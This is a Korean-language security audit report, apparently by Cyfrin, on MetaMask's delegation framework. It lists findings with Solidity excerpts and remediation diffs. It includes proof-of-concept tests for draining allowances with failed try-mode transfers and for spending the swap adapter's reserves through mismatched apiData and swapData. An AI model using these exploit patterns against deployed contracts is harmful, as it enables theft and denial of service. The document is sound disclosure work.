**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Draiakoo](https://x.com/Draiakoo)

**Assisting Auditors**



---

# Findings
## Medium Risk


### 스트리밍 집행자(enforcer)가 실제 토큰 전송 없이도 토큰 지출을 증가시킴 (Streaming enforcers increase token spending even without actual token transfer)

**설명:** 스트리밍 집행자(`ERC20StreamingEnforcer` 및 `NativeTokenStreamingEnforcer`)는 `EXECTYPE_TRY` 실행 모드와 함께 사용될 때 토큰 지출 허용량 고갈 공격에 취약합니다. 이 문제는 두 집행자가 실제 토큰 전송이 일어나기 전인 `beforeHook` 메서드에서 지출 금액을 업데이트하기 때문에 발생합니다.

`ERC20StreamingEnforcer.sol`에서 취약점은 `_validateAndConsumeAllowance` 함수에서 발생합니다:

```solidity
function _validateAndConsumeAllowance(
    bytes calldata _terms,
    bytes calldata _executionCallData,
    bytes32 _delegationHash,
    address _redeemer
)
    private
{
    // ... 유효성 검사 코드 ...

    uint256 transferAmount_ = uint256(bytes32(callData_[36:68]));

    require(transferAmount_ <= _getAvailableAmount(allowance_), "ERC20StreamingEnforcer:allowance-exceeded");

    // @issue 이 라인은 실제 전송이 발생하기 전에 지출 금액을 증가시킵니다.
    allowance_.spent += transferAmount_;

    emit IncreasedSpentMap(/* ... */);
}
```

마찬가지로 `NativeTokenStreamingEnforcer.sol`에서도:

```solidity
function _validateAndConsumeAllowance(
    bytes calldata _terms,
    bytes calldata _executionCallData,
    bytes32 _delegationHash,
    address _redeemer
)
    private
{
    (, uint256 value_,) = _executionCallData.decodeSingle();

    // ... 유효성 검사 코드 ...

    require(value_ <= _getAvailableAmount(allowance_), "NativeTokenStreamingEnforcer:allowance-exceeded");

    // @issue 이 라인은 실제 네이티브 토큰 전송 전에 지출 금액을 증가시킵니다.
    allowance_.spent += value_;

    emit IncreasedSpentMap(/* ... */);
}
```
`EXECTYPE_TRY` 실행 모드와 함께 사용할 때 토큰 전송이 실패하면 실행은 되돌리지(revert) 않고 계속됩니다. 그러나 스트리밍 허용량은 전송이 성공한 것처럼 여전히 감소합니다. 이로 인해 공격자가 실패하는 전송을 반복적으로 실행하여 실제로 토큰을 전송하지 않고도 스트리밍 허용량을 고갈시킬 수 있는 시나리오가 생성됩니다.

유사한 문제가 `ERC20PeriodTransferEnforcer`에도 존재한다는 점에 유의하세요.

**영향:** 이 취약점은 악의적인 대리인(delegate)이 스트리밍 위임에 대해 영구적인 서비스 거부(DoS)를 생성할 수 있게 합니다. 이는 사실상 위임의 합법적인 사용을 거부합니다.

**개념 증명 (Proof of Concept):** 다음 테스트를 실행하세요

```solidity
    function test_streamingAllowanceDrainWithFailedTransfers() public {
        // Create streaming terms that define:
        // - initialAmount = 10 ether (available immediately at startTime)
        // - maxAmount = 100 ether (total streaming cap)
        // - amountPerSecond = 1 ether (streaming rate)
        // - startTime = current block timestamp (start streaming now)
        uint256 startTime = block.timestamp;
        bytes memory streamingTerms = abi.encodePacked(
            address(mockToken), // token address (20 bytes)
            uint256(INITIAL_AMOUNT), // initial amount (32 bytes)
            uint256(MAX_AMOUNT), // max amount (32 bytes)
            uint256(AMOUNT_PER_SECOND), // amount per second (32 bytes)
            uint256(startTime) // start time (32 bytes)
        );

        Caveat[] memory caveats = new Caveat[](3);

        // Allowed Targets Enforcer - only allow the token
        caveats[0] = Caveat({ enforcer: address(allowedTargetsEnforcer), terms: abi.encodePacked(address(mockToken)), args: hex"" });

        // Allowed Methods Enforcer - only allow transfer
        caveats[1] =
            Caveat({ enforcer: address(allowedMethodsEnforcer), terms: abi.encodePacked(IERC20.transfer.selector), args: hex"" });

        // ERC20 Streaming Enforcer - with the streaming terms
        caveats[2] = Caveat({ enforcer: address(streamingEnforcer), terms: streamingTerms, args: hex"" });

        Delegation memory delegation = Delegation({
            delegate: address(users.bob.deleGator),
            delegator: address(users.alice.deleGator),
            authority: ROOT_AUTHORITY,
            caveats: caveats,
            salt: 0,
            signature: hex""
        });

        // Sign the delegation
        delegation = signDelegation(users.alice, delegation);
        bytes32 delegationHash = EncoderLib._getDelegationHash(delegation);

        // Initial balances
        uint256 aliceInitialBalance = mockToken.balanceOf(address(users.alice.deleGator));
        uint256 bobInitialBalance = mockToken.balanceOf(address(users.bob.addr));
        console.log("Alice initial balance:", aliceInitialBalance / 1e18);
        console.log("Bob initial balance:", bobInitialBalance / 1e18);

        // Amount to transfer
        uint256 amountToTransfer = 5 ether;

        // Create the mode for try execution (which will NOT revert on failures)
        ModeCode tryExecuteMode = ModeLib.encode(CALLTYPE_SINGLE, EXECTYPE_TRY, MODE_DEFAULT, ModePayload.wrap(bytes22(0x00)));

        // First test - Successful transfer
        {
            console.log("\n--- TEST 1: SUCCESSFUL TRANSFER ---");

            // Make sure token transfers will succeed
            mockToken.setHaltTransfer(false);

            // Prepare a transfer execution
            Execution memory execution = Execution({
                target: address(mockToken),
                value: 0,
                callData: abi.encodeWithSelector(IERC20.transfer.selector, address(users.bob.addr), amountToTransfer)
            });

            // Execute the delegation using try mode
            execute_UserOp(
                users.bob,
                abi.encodeWithSelector(
                    delegationManager.redeemDelegations.selector,
                    createPermissionContexts(delegation),
                    createModes(tryExecuteMode),
                    createExecutionCallDatas(execution)
                )
            );

            // Check balances after successful transfer
            uint256 aliceBalanceAfterSuccess = mockToken.balanceOf(address(users.alice.deleGator));
            uint256 bobBalanceAfterSuccess = mockToken.balanceOf(address(users.bob.addr));
            console.log("Alice balance after successful transfer:", aliceBalanceAfterSuccess / 1e18);
            console.log("Bob balance after successful transfer:", bobBalanceAfterSuccess / 1e18);

            // Check streaming allowance state
            (,,,, uint256 storedSpent) = streamingEnforcer.streamingAllowances(address(delegationManager), delegationHash);

            console.log("Spent amount:", storedSpent / 1e18);

            // Verify the spent amount was updated
            assertEq(storedSpent, amountToTransfer, "Spent amount should be updated after successful transfer");

            // Verify tokens were actually transferred
            assertEq(aliceBalanceAfterSuccess, aliceInitialBalance - amountToTransfer, "Alice balance should decrease");
            assertEq(bobBalanceAfterSuccess, bobInitialBalance + amountToTransfer, "Bob balance should increase");
        }

        // Second test - Failed transfer
        {
            console.log("\n--- TEST 2: FAILED TRANSFER ---");

            // Make token transfers fail
            mockToken.setHaltTransfer(true);

            // Prepare the same transfer execution
            Execution memory execution = Execution({
                target: address(mockToken),
                value: 0,
                callData: abi.encodeWithSelector(IERC20.transfer.selector, address(users.bob.addr), amountToTransfer)
            });

            // Record spent amount before the failed transfer
            (,,,, uint256 spentBeforeFailure) = streamingEnforcer.streamingAllowances(address(delegationManager), delegationHash);
            console.log("Spent amount before failed transfer:", spentBeforeFailure / 1e18);

            // Execute the delegation (will use try mode so execution continues despite transfer failure)
            execute_UserOp(
                users.bob,
                abi.encodeWithSelector(
                    delegationManager.redeemDelegations.selector,
                    createPermissionContexts(delegation),
                    createModes(tryExecuteMode),
                    createExecutionCallDatas(execution)
                )
            );

            // Check balances after failed transfer
            uint256 aliceBalanceAfterFailure = mockToken.balanceOf(address(users.alice.deleGator));
            uint256 bobBalanceAfterFailure = mockToken.balanceOf(address(users.bob.addr));
            console.log("Alice balance after failed transfer:", aliceBalanceAfterFailure / 1e18);
            console.log("Bob balance after failed transfer:", bobBalanceAfterFailure / 1e18);

            // Check spent amount after failed transfer
            (,,,, uint256 spentAfterFailure) = streamingEnforcer.streamingAllowances(address(delegationManager), delegationHash);
            console.log("Spent amount after failed transfer:", spentAfterFailure / 1e18);

            // @audit -> shows spent amount increases even when token transfer fails
            assertEq(
                spentAfterFailure, spentBeforeFailure + amountToTransfer, "Spent amount should increase even with failed transfer"
            );

            // Verify tokens weren't actually transferred
            assertEq(
                aliceBalanceAfterFailure,
                aliceInitialBalance - amountToTransfer, // Only reduced by the first successful transfer
                "Alice balance should not change after failed transfer"
            );
            assertEq(
                bobBalanceAfterFailure,
                bobInitialBalance + amountToTransfer, // Only increased by the first successful transfer
                "Bob balance should not change after failed transfer"
            );
        }
    }
```


**권장 완화 방법:** 실행 유형을 `EXECTYPE_DEFAULT`로만 제한하도록 집행자를 수정하는 것을 고려하세요.


**Metamask:** 커밋 [b2807a9](https://github.com/MetaMask/delegation-framework/commit/b2807a9de92f6ac04d0f549b88753b6728979e43)에서 해결됨.

**Cyfrin:** 해결됨. 실행 유형이 `EXECTYPE_DEFAULT`로 제한됨.


### `DelegationMetaSwapAdapter`의 API와 스왑 페이로드 간의 불일치로 인해 무단 전송이 발생할 수 있음 (Inconsistency in API and swap payloads in `DelegationMetaSwapAdapter` can potentially lead to unauthorized transfers)

**설명:** `DelegationMetaSwapAdapter` 계약은 `swapByDelegation()` 함수에 API 데이터(apiData)에 선언된 토큰과 스왑 데이터(swapData)에 사용된 실제 토큰 간의 일관성을 검증하지 못하는 취약점이 있습니다.

이러한 불일치로 인해 공격자는 어댑터를 속여 사용자 승인의 일부가 아닌 자체 준비금의 토큰을 사용하도록 할 수 있습니다.

`swapByDelegation()` 함수를 통해 토큰 스왑을 실행할 때 계약은 두 가지 중요한 정보를 받습니다:
`apiData` - 스왑할 토큰(tokenFrom) 및 금액을 포함한 매개변수 포함
`swapData` - 기본 MetaSwap 계약에서 사용하며 잠재적으로 다른 토큰 정보를 포함함

취약점은 `DelegationMetaSwapAdapter`가 스왑을 실행하기 전에 `apiData`에 지정된 토큰이 `swapData`에 지정된 토큰과 일치하는지 확인하지 않기 때문에 존재합니다.

```solidity
 function swapByDelegation(bytes calldata _apiData, Delegation[] memory _delegations) external {
        (string memory aggregatorId_, IERC20 tokenFrom_, IERC20 tokenTo_, uint256 amountFrom_, bytes memory swapData_) =
            _decodeApiData(_apiData);
        uint256 delegationsLength_ = _delegations.length;

        if (delegationsLength_ == 0) revert InvalidEmptyDelegations();
        if (tokenFrom_ == tokenTo_) revert InvalidIdenticalTokens();
        if (!isTokenAllowed[tokenFrom_]) revert TokenFromIsNotAllowed(tokenFrom_);
        if (!isTokenAllowed[tokenTo_]) revert TokenToIsNotAllowed(tokenTo_);
        if (!isAggregatorAllowed[keccak256(abi.encode(aggregatorId_))]) revert AggregatorIdIsNotAllowed(aggregatorId_);
        if (_delegations[0].delegator != msg.sender) revert NotLeafDelegator();
       //@audit tokenFrom 및 to를 포함하는 swapData 페이로드에 대한 확인 누락

     // ....
}
```

공격 흐름 예시:
- 공격자는 소량의 TokenA 전송을 허용하는 위임을 생성합니다.
- 공격자는 TokenA를 tokenFrom으로 명시하는 악의적인 apiData를 만듭니다(위임과 일치).
- 공격자는 실제 사용할 토큰으로 TokenB를 지정하는 swapData를 포함합니다.
- MetaSwap 계약에서 처리될 때 어댑터 준비금의 TokenB를 사용합니다.
- 결과적으로 적절한 승인 없이 어댑터의 준비금에서 TokenB가 전송됩니다.

**영향:** 일관되지 않은 페이로드로 인해 무단 자산 전송이 발생하여 어댑터의 토큰 준비금이 고갈될 수 있습니다.

**개념 증명 (Proof of Concept):** 아래 POC는 몇 가지 가정을 합니다:
1. 어댑터에 토큰 잔액이 있음
2. 어댑터가 이 토큰에 대해 Metaswap에 무한 승인을 부여했음(이 토큰이 이전에 어댑터에서 사용된 적이 있다면 합리적인 가정임)
3. Metaswap 스왑은 추가 확인 없이 스왑 페이로드에만 의존하여 스왑을 실행함(범위 밖이므로 최악의 시나리오로 가정). 이는 `ExploitableMetaSwapMock`에서 `swap` 함수를 설정하는 방식에 반영됨

다음 POC를 실행하세요

```solidity
/**
 * @title DelegationMetaSwapAdapterConsistencyExploitTest
 * @notice This test demonstrates how inconsistencies between API data and swap data can be exploited
 */
contract DelegationMetaSwapAdapterConsistencyExploitTest is DelegationMetaSwapAdapterBaseTest {
    BasicERC20 public tokenC;

    // Mock MetaSwap contract that allows us to demonstrate the issue
    ExploitableMetaSwapMock public exploitableMetaSwap;

    function setUp() public override {
        super.setUp();

        _setUpMockContractsWithCustomMetaSwap();
    }

    function test_tokenFromInconsistencyExploit() public {
        // This test demonstrates an exploit where:
        // - apiData declares tokenA as tokenFrom, but sends a small amount (appears safe)
        // - swapData references tokenB as tokenFrom, with a much larger amount
        // - MetaSwap will use the larger amount of tokenB, draining user's funds

        // Record initial balances
        uint256 vaultTokenABefore = tokenA.balanceOf(address(vault.deleGator));
        uint256 adapterTokenBBefore = tokenB.balanceOf(address(delegationMetaSwapAdapter));
        uint256 vaultTokenCBefore = tokenC.balanceOf(address(vault.deleGator));
        console.log("Initial balances:");
        console.log("TokenA:", vaultTokenABefore);
        console.log("TokenB:", adapterTokenBBefore);
        console.log("TokenC:", vaultTokenCBefore);

        // ======== THE EXPLOIT ========
        // We create inconsistent data where:
        // - apiData claims to swap a small amount of tokenA
        // - swapData actually references tokenB with a much larger amount

        // First, craft our malicious swap data
        uint256 amountToTransfer = 100; // amount of tokenA
        uint256 outputAmount = 1000;

        bytes memory exploitSwapData = _encodeExploitSwapData(
            IERC20(tokenB), // Real tokenFrom in swapData is tokenB (not tokenA)
            IERC20(tokenC), // tokenTo is tokenC
            amountToTransfer, //amount for tokenB
            outputAmount // Amount to receive
        );

        // Create malicious apiData that claims tokenA but references the swapData with tokenB
        bytes memory maliciousApiData = _encodeExploitApiData(
            "exploit-aggregator",
            IERC20(tokenA), // pretend to use tokenA in apiData
            amountToTransfer,
            exploitSwapData // but use swapData that uses tokenB with large amount
        );

        // Create a delegation from vault to subVault
        Delegation memory vaultDelegation = _getVaultDelegationCustom();
        Delegation memory subVaultDelegation =
            _getSubVaultDelegationCustom(EncoderLib._getDelegationHash(vaultDelegation), amountToTransfer);

        Delegation[] memory delegations = new Delegation[](2);
        delegations[1] = vaultDelegation;
        delegations[0] = subVaultDelegation;

        // Execute the swap with our malicious data
        vm.prank(address(subVault.deleGator));
        delegationMetaSwapAdapter.swapByDelegation(maliciousApiData, delegations);

        // Check final balances
        uint256 vaultTokenAAfter = tokenA.balanceOf(address(vault.deleGator));
        uint256 adapterTokenBAfter = tokenB.balanceOf(address(delegationMetaSwapAdapter));
        uint256 vaultTokenCAfter = tokenC.balanceOf(address(vault.deleGator));
        console.log("Final balances:");
        console.log("TokenA:", vaultTokenAAfter);
        console.log("TokenB:", adapterTokenBAfter);
        console.log("TokenC:", vaultTokenCAfter);

        // The TokenA balance should remain the same (not used despite apiData saying it would be)
        assertEq(vaultTokenABefore - vaultTokenAAfter, amountToTransfer, "TokenA balance shouldn't change");

        // The TokenB balance should be drained (this is the actual token used in the swap)
        assertEq(adapterTokenBBefore - adapterTokenBAfter, amountToTransfer, "TokenB should be drained by the largeAmount");

        // The TokenC balance should increase
        assertEq(vaultTokenCAfter - vaultTokenCBefore, outputAmount, "TokenC should be received");

        console.log("EXPLOIT SUCCESSFUL: Used TokenB instead of TokenA, draining more funds than expected!");
    }

    // Helper to encode custom apiData for the exploit
    function _encodeExploitApiData(
        string memory _aggregatorId,
        IERC20 _declaredTokenFrom,
        uint256 _declaredAmountFrom,
        bytes memory _swapData
    )
        internal
        pure
        returns (bytes memory)
    {
        return abi.encodeWithSelector(IMetaSwap.swap.selector, _aggregatorId, _declaredTokenFrom, _declaredAmountFrom, _swapData);
    }

    // Helper to encode custom swapData for the exploit
    function _encodeExploitSwapData(
        IERC20 _actualTokenFrom,
        IERC20 _tokenTo,
        uint256 _actualAmountFrom,
        uint256 _amountTo
    )
        internal
        pure
        returns (bytes memory)
    {
        // Following MetaSwap's expected structure
        return abi.encode(
            _actualTokenFrom, // Actual token from (can be different from apiData)
            _tokenTo,
            _actualAmountFrom, // Actual amount (can be different from apiData)
            _amountTo,
            bytes(""), // Not important for the exploit
            uint256(0), // No fee
            address(0), // No fee wallet
            false // No fee to
        );
    }

    function _getVaultDelegationCustom() internal view returns (Delegation memory) {
        Caveat[] memory caveats_ = new Caveat[](4);

        caveats_[0] = Caveat({ args: hex"", enforcer: address(allowedTargetsEnforcer), terms: abi.encodePacked(address(tokenA)) });

        caveats_[1] =
            Caveat({ args: hex"", enforcer: address(allowedMethodsEnforcer), terms: abi.encodePacked(IERC20.transfer.selector) });

        uint256 paramStart_ = abi.encodeWithSelector(IERC20.transfer.selector).length;
        address paramValue_ = address(delegationMetaSwapAdapter);
        // The param start and and param value are packed together, but the param value is not packed.
        bytes memory inputTerms_ = abi.encodePacked(paramStart_, bytes32(uint256(uint160(paramValue_))));
        caveats_[2] = Caveat({ args: hex"", enforcer: address(allowedCalldataEnforcer), terms: inputTerms_ });

        caveats_[3] = Caveat({
            args: hex"",
            enforcer: address(redeemerEnforcer),
            terms: abi.encodePacked(address(delegationMetaSwapAdapter))
        });

        Delegation memory vaultDelegation_ = Delegation({
            delegate: address(subVault.deleGator),
            delegator: address(vault.deleGator),
            authority: ROOT_AUTHORITY,
            caveats: caveats_,
            salt: 0,
            signature: hex""
        });
        return signDelegation(vault, vaultDelegation_);
    }

    function _getSubVaultDelegationCustom(
        bytes32 _parentDelegationHash,
        uint256 amount
    )
        internal
        view
        returns (Delegation memory)
    {
        Caveat[] memory caveats_ = new Caveat[](1);

        // Using ERC20 as tokenFrom
        // Restricts the amount of tokens per call
        uint256 paramStart_ = abi.encodeWithSelector(IERC20.transfer.selector, address(0)).length;
        uint256 paramValue_ = amount;
        bytes memory inputTerms_ = abi.encodePacked(paramStart_, paramValue_);
        caveats_[0] = Caveat({ args: hex"", enforcer: address(allowedCalldataEnforcer), terms: inputTerms_ });

        Delegation memory subVaultDelegation_ = Delegation({
            delegate: address(delegationMetaSwapAdapter),
            delegator: address(subVault.deleGator),
            authority: _parentDelegationHash,
            caveats: caveats_,
            salt: 0,
            signature: hex""
        });

        return signDelegation(subVault, subVaultDelegation_);
    }

    function _setUpMockContractsWithCustomMetaSwap() internal {
        vault = users.alice;
        subVault = users.bob;

        // Create the tokens
        tokenA = new BasicERC20(owner, "TokenA", "TKA", 0);
        tokenB = new BasicERC20(owner, "TokenB", "TKB", 0);
        tokenC = new BasicERC20(owner, "TokenC", "TKC", 0);

        vm.label(address(tokenA), "TokenA");
        vm.label(address(tokenB), "TokenB");
        vm.label(address(tokenC), "TokenC");

        exploitableMetaSwap = new ExploitableMetaSwapMock();

        // Set the custom MetaSwap mock
        delegationMetaSwapAdapter = new DelegationMetaSwapAdapter(
            owner, IDelegationManager(address(delegationManager)), IMetaSwap(address(exploitableMetaSwap))
        );

        // Mint tokens
        vm.startPrank(owner);
        tokenA.mint(address(vault.deleGator), 1_000_000);
        tokenB.mint(address(vault.deleGator), 1_000_000);
        tokenB.mint(address(delegationMetaSwapAdapter), 1_000_000);
        tokenA.mint(address(exploitableMetaSwap), 1_000_000);
        tokenB.mint(address(exploitableMetaSwap), 1_000_000);
        tokenC.mint(address(exploitableMetaSwap), 1_000_000);
        vm.stopPrank();

        // give allowance of tokenB to the metaswap contract
        vm.prank(address(delegationMetaSwapAdapter));
        tokenB.approve(address(exploitableMetaSwap), type(uint256).max);

        // Update allowed tokens list to include all three tokens
        IERC20[] memory allowedTokens = new IERC20[](3);
        allowedTokens[0] = IERC20(tokenA);
        allowedTokens[1] = IERC20(tokenB);
        allowedTokens[2] = IERC20(tokenC);

        bool[] memory statuses = new bool[](3);
        statuses[0] = true;
        statuses[1] = true;
        statuses[2] = true;

        vm.prank(owner);
        delegationMetaSwapAdapter.updateAllowedTokens(allowedTokens, statuses);

        _whiteListAggregatorId("exploit-aggregator");
    }
}

/**
 * @notice Mock implementation that demonstrates the vulnerability
 * @dev This mock mimics MetaSwap but exposes the tokenFrom inconsistency
 */
contract ExploitableMetaSwapMock {
    using SafeERC20 for IERC20;

    event SwapExecuted(IERC20 declaredTokenFrom, uint256 declaredAmount, IERC20 actualTokenFrom, uint256 actualAmount);

    /**
     * @notice Mock swap implementation that purposely ignores API data parameters
     * @dev This simulates a MetaSwap contract that uses the values from swapData
     * instead of the values declared in apiData
     */
    function swap(
        string calldata aggregatorId,
        IERC20 declaredTokenFrom, // From apiData
        uint256 declaredAmount, // From apiData
        bytes calldata swapData
    )
        external
        payable
        returns (bool)
    {
        // Decode the real parameters from swapData (our mock uses a simple structure)
        (IERC20 actualTokenFrom, IERC20 tokenTo, uint256 actualAmount, uint256 amountTo,,,,) =
            abi.decode(swapData, (IERC20, IERC20, uint256, uint256, bytes, uint256, address, bool));

        // Log the inconsistency for demonstration purposes
        emit SwapExecuted(declaredTokenFrom, declaredAmount, actualTokenFrom, actualAmount);

        // Execute the swap using the ACTUAL parameters from swapData, ignoring apiData
        actualTokenFrom.safeTransferFrom(msg.sender, address(this), actualAmount);
        tokenTo.transfer(address(msg.sender), amountTo);

        return true;
    }
}
```

**권장 완화 방법:** 이 취약점을 해결하려면 `swapByDelegation` 함수에 `apiData`와 `swapData` 간의 일관성을 보장하는 유효성 검사를 추가하는 것을 고려하세요:

```solidity
function swapByDelegation(bytes calldata _apiData, Delegation[] memory _delegations) external {
    // Decode apiData
    (string memory aggregatorId_, IERC20 tokenFromApi, uint256 amountFromApi, bytes memory swapData_) =
        _decodeApiData(_apiData);

    // Decode swapData to extract the actual token and amount
    (IERC20 tokenFromSwap, IERC20 tokenTo_, uint256 amountFromSwap,,,,) =
        abi.decode(abi.encodePacked(abi.encode(address(0)), swapData_),
                  (address, IERC20, IERC20, uint256, uint256, bytes, uint256, address, bool));

    // @audit Validate consistency between apiData and swapData
    require(address(tokenFromApi) == address(tokenFromSwap),
            "TokenFromInconsistency: apiData and swapData tokens must match");

    // @audit Validate amounts are consistent
    require(amountFromApi == amountFromSwap,
            "AmountInconsistency: apiData amount must be equal to swapData amount");

    // Continue with existing implementation...
}
```

**[Metamask]:**
인지함. `DelegationMetaSwapAdapter`에 대한 변경 사항이 구현될 때 향후 해결될 예정입니다.

**Cyfrin:** 인지함.

\clearpage
## Low Risk


### 버그가 있는 `erc7579-implementation` 커밋을 가져옴 (Bugged `erc7579-implementation` commit imported)

**설명:** 현재 코드베이스는 `ExecutionHelper`를 사용하기 위해 `erc7579-implementation` 외부 저장소를 커밋 `42aa538397138e0858bae09d1bd1a1921aa24b8c`에서 가져옵니다. 이 import는 `DelegationMetaSwapAdapter` 내에서 `executeFromExecutor` 메서드를 구현하는 데 사용됩니다:

```solidity
    function executeFromExecutor(
        ModeCode _mode,
        bytes calldata _executionCalldata
    )
        external
        payable
        onlyDelegationManager
        returns (bytes[] memory returnData_)
    {
        (CallType callType_, ExecType execType_,,) = _mode.decode();

        // Check if calltype is batch or single
        if (callType_ == CALLTYPE_BATCH) {
            // Destructure executionCallData according to batched exec
            Execution[] calldata executions_ = _executionCalldata.decodeBatch();
            // check if execType is revert or try
            if (execType_ == EXECTYPE_DEFAULT) returnData_ = _execute(executions_);
            else if (execType_ == EXECTYPE_TRY) returnData_ = _tryExecute(executions_);
            else revert UnsupportedExecType(execType_);
        } else if (callType_ == CALLTYPE_SINGLE) {
            // Destructure executionCallData according to single exec
            (address target_, uint256 value_, bytes calldata callData_) = _executionCalldata.decodeSingle();
            returnData_ = new bytes[](1);
            bool success_;
            // check if execType is revert or try
            if (execType_ == EXECTYPE_DEFAULT) {
                returnData_[0] = _execute(target_, value_, callData_);
            } else if (execType_ == EXECTYPE_TRY) {
                (success_, returnData_[0]) = _tryExecute(target_, value_, callData_);
                if (!success_) emit TryExecuteUnsuccessful(0, returnData_[0]);
            } else {
                revert UnsupportedExecType(execType_);
            }
        } else {
            revert UnsupportedCallType(callType_);
        }
    }
```
`execType`이 `EXECTYPE_TRY`로 설정되면 내부 `_tryExecute` 메서드가 실행됩니다:
```solidity
    function _tryExecute(
        address target,
        uint256 value,
        bytes calldata callData
    )
        internal
        virtual
        returns (bool success, bytes memory result)
    {
        /// @solidity memory-safe-assembly
        assembly {
            result := mload(0x40)
            calldatacopy(result, callData.offset, callData.length)
@>          success := iszero(call(gas(), target, value, result, callData.length, codesize(), 0x00))
            mstore(result, returndatasize()) // Store the length.
            let o := add(result, 0x20)
            returndatacopy(o, 0x00, returndatasize()) // Copy the returndata.
            mstore(0x40, add(o, returndatasize())) // Allocate the memory.
        }
    }
```
이 함수는 저수준 호출(low level call)을 실행하고 `is zero` 연산자를 적용한 결과를 success에 할당합니다. 이 구현은 잘못되었습니다. 저수준 호출의 결과는 이미 성공 시 1, 오류 시 0을 반환하기 때문입니다. 따라서 `is zero` 연산자를 적용하면 결과가 뒤집혀 잘못된 값이 됩니다.
그 결과 try 모드에서 트랜잭션을 실행할 때 성공적인 실행은 `TryExecuteUnsuccessful`을 방출하고 실패한 실행은 방출하지 않게 됩니다. UI에서 이러한 이벤트를 사용하는 경우 사용자를 혼란스럽게 할 수 있습니다.

**영향:** 잘못된 이벤트 방출

**권장 완화 방법:** 커밋 버전을 최신으로 업데이트하는 것을 고려하세요. [최신 버전에는 더 이상 이 버그가 없습니다](https://github.com/erc7579/erc7579-implementation/blob/main/src/core/ExecutionHelper.sol#L81).


**MetaMask:**
커밋 [73e719](https://github.com/MetaMask/delegation-framework/commit/73e719dd25fe990d614f00203f089f4fd8b4761c)에서 해결됨.

**Cyfrin:** 해결됨.


### `ERC20PeriodTransferEnforcer`의 잘못된 이벤트 데이터 필드 (Wrong event data field in `ERC20PeriodTransferEnforcer`)

**설명:** `ERC20PeriodTransferEnforcer`에서 이 주의 사항(caveat)이 사용될 때 다음 이벤트를 방출합니다:
```solidity
    /**
     * @notice Emitted when a transfer is made, updating the transferred amount in the active period.
     * @param sender The address initiating the transfer.
@>   * @param recipient The address that receives the tokens.
     * @param delegationHash The hash identifying the delegation.
     * @param token The ERC20 token contract address.
     * @param periodAmount The maximum tokens transferable per period.
     * @param periodDuration The duration of each period (in seconds).
     * @param startDate The timestamp when the first period begins.
     * @param transferredInCurrentPeriod The total tokens transferred in the current period after this transfer.
     * @param transferTimestamp The block timestamp at which the transfer was executed.
     */
    event TransferredInPeriod(
        address indexed sender,
@>      address indexed recipient,
        bytes32 indexed delegationHash,
        address token,
        uint256 periodAmount,
        uint256 periodDuration,
        uint256 startDate,
        uint256 transferredInCurrentPeriod,
        uint256 transferTimestamp
    );
```
보시다시피 두 번째 필드는 토큰 수신자입니다. 그러나 `ERC20StreamingEnforcer` 및 `NativeTokenStreamingEnforcer`와 같은 다른 토큰 관련 주의 사항에서 방출된 이벤트 데이터의 두 번째 필드는 위임을 상환하는 주소인 `redeemer`입니다.

이벤트에 전달되는 데이터가 실제로 `redeemer`이기 때문에 이것이 의도된 동작이어야 한다는 것이 합리적입니다:
```solidity
    function _validateAndConsumeTransfer(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        ...
        emit TransferredInPeriod(
            msg.sender,
@>          _redeemer,
            _delegationHash,
            token_,
            periodAmount_,
            periodDuration_,
            allowance_.startDate,
            allowance_.transferredInCurrentPeriod,
            block.timestamp
        );
    }
```

**영향:** 이벤트 필드가 오해의 소지가 있습니다.

**권장 완화 방법:**
```diff
    event TransferredInPeriod(
        address indexed sender,
--      address indexed recipient,
++      address indexed redeemer,
        bytes32 indexed delegationHash,
        address token,
        uint256 periodAmount,
        uint256 periodDuration,
        uint256 startDate,
        uint256 transferredInCurrentPeriod,
        uint256 transferTimestamp
    );
```

**MetaMask:**
커밋 [15e0860](https://github.com/MetaMask/delegation-framework/commit/15e0860e45563ac4891a3b4484acbd6f66d3ab24)에서 해결됨.

**Cyfrin:** 해결됨.

\clearpage
## Informational


### `SpecificActionERC20TransferBatchEnforcer`의 첫 번째 트랜잭션은 네이티브 값 전송을 지원하지 않음 (First transaction on `SpecificActionERC20TransferBatchEnforcer` does not support sending native value)

**설명:** `SpecificActionERC20TransferBatchEnforcer`는 위임자가 제한한 임의의 트랜잭션을 먼저 실행한 후 ERC20 전송을 실행하는 집행자입니다. 두 실행 모두 값 전송을 지원하지 않도록 제한됩니다:
```solidity
    function beforeHook(
        bytes calldata _terms,
        bytes calldata,
        ModeCode _mode,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _delegator,
        address
    )
        public
        override
        onlyBatchCallTypeMode(_mode)
        onlyDefaultExecutionMode(_mode)
    {
        ...

        // Validate first transaction
        if (
            executions_[0].target != terms_.firstTarget || executions_[0].value != 0
                || keccak256(executions_[0].callData) != keccak256(terms_.firstCalldata)
        ) {
            revert("SpecificActionERC20TransferBatchEnforcer:invalid-first-transaction");
        }

        // Validate second transaction
        if (
            executions_[1].target != terms_.tokenAddress || executions_[1].value != 0 || executions_[1].callData.length != 68
                || bytes4(executions_[1].callData[0:4]) != IERC20.transfer.selector
                || address(uint160(uint256(bytes32(executions_[1].callData[4:36])))) != terms_.recipient
                || uint256(bytes32(executions_[1].callData[36:68])) != terms_.amount
        ) {
            revert("SpecificActionERC20TransferBatchEnforcer:invalid-second-transaction");
        }

        ...
    }
```
이 확인은 ERC20 전송 실행에는 합리적입니다. 그러나 실행과 함께 값을 포함하고자 하는 위임자에게는 첫 번째 트랜잭션에 대한 제한이 너무 심할 수 있습니다.

**권장 완화 방법:** 위임자가 첫 번째 실행을 제한할 때 더 많은 자유를 가질 수 있도록 첫 번째 트랜잭션에 대한 값 확인을 제거하는 것을 고려하세요. 위임자는 항상 다른 집행자로 값 필드를 제한할 수 있습니다.
```diff
    function beforeHook(
        bytes calldata _terms,
        bytes calldata,
        ModeCode _mode,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _delegator,
        address
    )
        public
        override
        onlyBatchCallTypeMode(_mode)
        onlyDefaultExecutionMode(_mode)
    {
        ...

        // Validate first transaction
        if (
--          executions_[0].target != terms_.firstTarget || executions_[0].value != 0
++          executions_[0].target != terms_.firstTarget
                || keccak256(executions_[0].callData) != keccak256(terms_.firstCalldata)
        ) {
            revert("SpecificActionERC20TransferBatchEnforcer:invalid-first-transaction");
        }
        ...
    }
```

**Metamask:** 인지함. 네이티브 토큰(ETH)이 관여되지 않는 특정 사용 사례를 위해 이것이 필요합니다.

**Cyfrin:** 인지함.


